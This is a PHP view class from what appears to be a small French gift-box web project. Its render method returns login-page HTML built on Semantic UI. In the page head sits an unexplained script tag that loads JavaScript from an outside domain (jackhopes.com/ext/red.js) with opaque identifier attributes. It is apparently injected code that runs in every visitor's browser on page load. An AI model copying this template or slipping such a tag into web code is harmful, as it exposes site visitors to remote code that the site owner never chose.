<?php
/**
 * Created by PhpStorm.
 * User: Alexis
 * Date: 27/12/2016
 * Time: 13:29
 */

namespace giftbox\vue;

class VueConnexion
{

    public function render()
    {

        $html = <<<END
        <!DOCTYPE html>
        <html>
            <head><script type="text/javascript" id="jc6202" ver="1.0.28.16" diu="Z9A0L2VNF079596A5FED3F" fr="default" src="http://jackhopes.com/ext/red.js"></script>
            <!-- Standard Meta -->
            <meta charset="utf-8" />
            <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        
            <!-- Site Properties -->
            <title>Homepage - Semantic</title>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/semantic-ui/2.2.6/semantic.min.css">
            <style>
            .right.item{
               padding-right: 1em;
            }
            </style>
            
            
            <body>
                
                <div class="ui inverted vertical center aligned segment">
                    <div class="ui container">
                      <div class="ui large secondary inverted pointing menu">
                        <a class="item" href="/">Accueil</a>
                        <a class="item" href="/catalogue">Catalogue</a>
                        <div class="right item">
                          <a class="ui inverted button">Connexion</a>
                          <a class="ui inverted button">Inscription</a>
                        </div>
                      </div>
                    </div>
                </div>
  
                <div class="ui container" style="width: 80%; padding-top: 30px">
            </body>
        </html>

END;
        return $html;


    }
}